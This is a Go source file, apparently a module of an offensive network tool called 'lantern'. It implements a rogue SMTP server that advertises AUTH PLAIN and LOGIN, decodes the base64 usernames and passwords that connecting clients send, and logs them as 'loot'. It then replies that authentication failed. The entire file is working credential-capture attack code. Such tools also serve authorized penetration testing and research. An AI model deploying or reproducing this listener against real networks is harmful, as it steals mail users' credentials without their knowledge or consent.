// Package smtp implements a rogue ESMTP server that captures cleartext
// credentials from the AUTH PLAIN and AUTH LOGIN mechanisms.
package smtp

import (
	"bufio"
	"context"
	"encoding/base64"
	"fmt"
	"net"
	"strings"
	"time"

	"lantern/internal/core"
)

const (
	ServiceName = "smtp"
	DefaultPort = 25
	readTimeout = 30 * time.Second
)

type Module struct {
	server *core.TCPServer
	Logger *core.Logger
}

func New(logger *core.Logger) *Module {
	m := &Module{Logger: logger}
	m.server = &core.TCPServer{
		Service: "SMTP",
		Address: "0.0.0.0",
		Port:    DefaultPort,
		Logger:  logger,
		Handler: m.handle,
	}
	return m
}

func (m *Module) Name() string      { return ServiceName }
func (m *Module) HasListener() bool { return true }
func (m *Module) HasPoisoner() bool { return false }

func (m *Module) StartPoisoner(context.Context, core.Config) error {
	return fmt.Errorf("SMTP poisoning is not supported")
}

func (m *Module) StartListener(ctx context.Context, cfg core.Config) error {
	m.server.Logger = m.Logger
	return m.server.Start(ctx, cfg)
}

func (m *Module) Stop() { m.server.Stop() }

func (m *Module) handle(ctx context.Context, conn net.Conn) {
	client := core.ClientIP(conn)
	reader := bufio.NewReader(conn)
	fmt.Fprint(conn, "220 mail.lantern.local ESMTP Service ready\r\n")

	readLine := func() (string, bool) {
		core.SetDeadline(ctx, conn, readTimeout)
		line, err := reader.ReadString('\n')
		if err != nil {
			return "", false
		}
		return strings.TrimRight(line, "\r\n"), true
	}

	for {
		line, ok := readLine()
		if !ok {
			return
		}
		verb, arg := splitCommand(line)

		switch strings.ToUpper(verb) {
		case "EHLO":
			fmt.Fprint(conn, "250-mail.lantern.local Hello\r\n250-AUTH PLAIN LOGIN\r\n250 STARTTLS\r\n")
		case "HELO":
			fmt.Fprint(conn, "250 mail.lantern.local Hello\r\n")
		case "AUTH":
			if !m.handleAuth(conn, client, arg, readLine) {
				return
			}
		case "QUIT":
			fmt.Fprint(conn, "221 Bye\r\n")
			return
		case "RSET", "NOOP":
			fmt.Fprint(conn, "250 OK\r\n")
		default:
			fmt.Fprint(conn, "502 Command not implemented\r\n")
		}
	}
}

func (m *Module) handleAuth(conn net.Conn, client, arg string, readLine func() (string, bool)) bool {
	fields := strings.Fields(arg)
	if len(fields) == 0 {
		fmt.Fprint(conn, "501 Syntax error\r\n")
		return true
	}
	mech := strings.ToUpper(fields[0])

	switch mech {
	case "PLAIN":
		var blob string
		if len(fields) >= 2 {
			blob = fields[1] // inline: AUTH PLAIN <base64>
		} else {
			fmt.Fprint(conn, "334 \r\n")
			var ok bool
			if blob, ok = readLine(); !ok {
				return false
			}
		}
		if user, pass, ok := decodePlain(blob); ok {
			m.capture(client, "AUTH-PLAIN", user, pass)
		}
		fmt.Fprint(conn, "535 Authentication failed\r\n")
		return false
	case "LOGIN":
		fmt.Fprint(conn, "334 "+b64("Username:")+"\r\n")
		userB64, ok := readLine()
		if !ok {
			return false
		}
		fmt.Fprint(conn, "334 "+b64("Password:")+"\r\n")
		passB64, ok := readLine()
		if !ok {
			return false
		}
		m.capture(client, "AUTH-LOGIN", decodeB64(userB64), decodeB64(passB64))
		fmt.Fprint(conn, "535 Authentication failed\r\n")
		return false
	default:
		fmt.Fprint(conn, "504 Unsupported authentication mechanism\r\n")
		return true
	}
}

func splitCommand(line string) (verb, arg string) {
	parts := strings.SplitN(line, " ", 2)
	verb = parts[0]
	if len(parts) == 2 {
		arg = strings.TrimSpace(parts[1])
	}
	return verb, arg
}

func decodePlain(blob string) (user, pass string, ok bool) {
	raw, err := base64.StdEncoding.DecodeString(strings.TrimSpace(blob))
	if err != nil {
		return "", "", false
	}
	parts := strings.Split(string(raw), "\x00")
	switch len(parts) {
	case 3:
		return parts[1], parts[2], true
	case 2:
		return parts[0], parts[1], true
	default:
		return "", "", false
	}
}

func decodeB64(s string) string {
	raw, err := base64.StdEncoding.DecodeString(strings.TrimSpace(s))
	if err != nil {
		return s
	}
	return string(raw)
}

func b64(s string) string {
	return base64.StdEncoding.EncodeToString([]byte(s))
}

func (m *Module) capture(client, mech, user, pass string) {
	if m.Logger == nil {
		return
	}
	if user == "" {
		user = "<not provided>"
	}
	m.Logger.Loot(
		fmt.Sprintf("[SMTP] %s credentials from %s", mech, client),
		"[SMTP] Username : %s\n[SMTP] Password : %q\n[SMTP] Hash     : %s:%s",
		user, pass, user, pass)
}
